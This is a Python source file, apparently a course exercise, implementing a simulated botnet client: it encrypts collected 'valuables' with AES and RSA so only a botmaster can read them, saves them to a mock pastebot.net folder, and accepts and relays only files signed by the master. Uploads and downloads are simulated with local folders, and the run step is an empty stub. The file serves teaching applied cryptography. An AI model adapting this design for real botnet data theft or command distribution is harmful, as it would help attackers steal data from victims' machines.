import os
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_PSS
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}
# Valuable data to be sent to the botmaster
valuables = []

###

def save_valuable(data):
    valuables.append(data)

"""
    AES and RSA will be used for encryption, where AES with CBC mode will be used to encrypted
    the actual data, and RSA will be used to be encrypt AES key. Final encrypted data will be
    in the format of iv | encrypted AES key | encrypted actual data.
"""
def encrypt_for_master(data):
    # Define padding funtion for CBC mode
    size_to_add = lambda s: AES.block_size - len(s) % AES.block_size
    pad = lambda s: s + bytes((size_to_add(s)) * chr(size_to_add(s)), "ascii")
    # Initialise AES cipher
    aes_key = Random.new().read(32)
    iv = Random.new().read(AES.block_size)
    aes_cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    # Encrypt data
    encrypted_data = aes_cipher.encrypt(pad(data))
    # Read public key
    key_file = open('publicKey.pem')
    public_key = RSA.importKey(key_file.read())
    key_file.close()
    # Encrypt AES key with PKCS1 OAEP
    rsa_cipher = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    # Return concat of three components
    return iv + encrypted_aes_key + encrypted_data

def upload_valuables_to_pastebot(fn):
    # Encrypt the valuables so only the bot master can read them
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "ascii")
    encrypted_master = encrypt_for_master(valuable_data)

    # "Upload" it to pastebot (i.e. save in pastebot folder)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()

    print("Saved valuables to pastebot.net/%s for the botnet master" % fn)

###

def verify_file(f):
    # Separate signature and contents by signature size (key generated with 256 bytes RSA)
    signature = f[:256]
    contents = f[256:]
    # Read public key
    key_file = open('publicKey.pem')
    public_key = RSA.importKey(key_file.read())
    key_file.close()
    # Verify the signature
    h = SHA256.new()
    h.update(contents)
    verifier = PKCS1_PSS.new(public_key)
    return True if verifier.verify(h, signature) else False

def process_file(fn, f):
    if verify_file(f):
        # If it was, store it unmodified
        # (so it can be sent to other bots)
        # Decrypt and run the file
        filestore[fn] = f
        print("Stored the received file as %s" % fn)
    else:
        print("The file has not been signed by the botnet master")

def download_from_pastebot(fn):
    # "Download" the file from pastebot.net
    # (i.e. pretend we are and grab it from disk)
    # Open the file as bytes and load into memory
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f)

def p2p_download_file(sconn):
    # Download the file from the other bot
    fn = str(sconn.recv(), "ascii")
    f = sconn.recv()
    print("Receiving %s via P2P" % fn)
    process_file(fn, f)

###

def p2p_upload_file(sconn, fn):
    # Grab the file and upload it to the other bot
    # You don't need to encrypt it only files signed
    # by the botnet master should be accepted
    # (and your bot shouldn't be able to sign like that!)
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    print("Sending %s via P2P" % fn)
    sconn.send(fn)
    sconn.send(filestore[fn])

def run_file(f):
    # If the file can be run,
    # run the commands
    pass
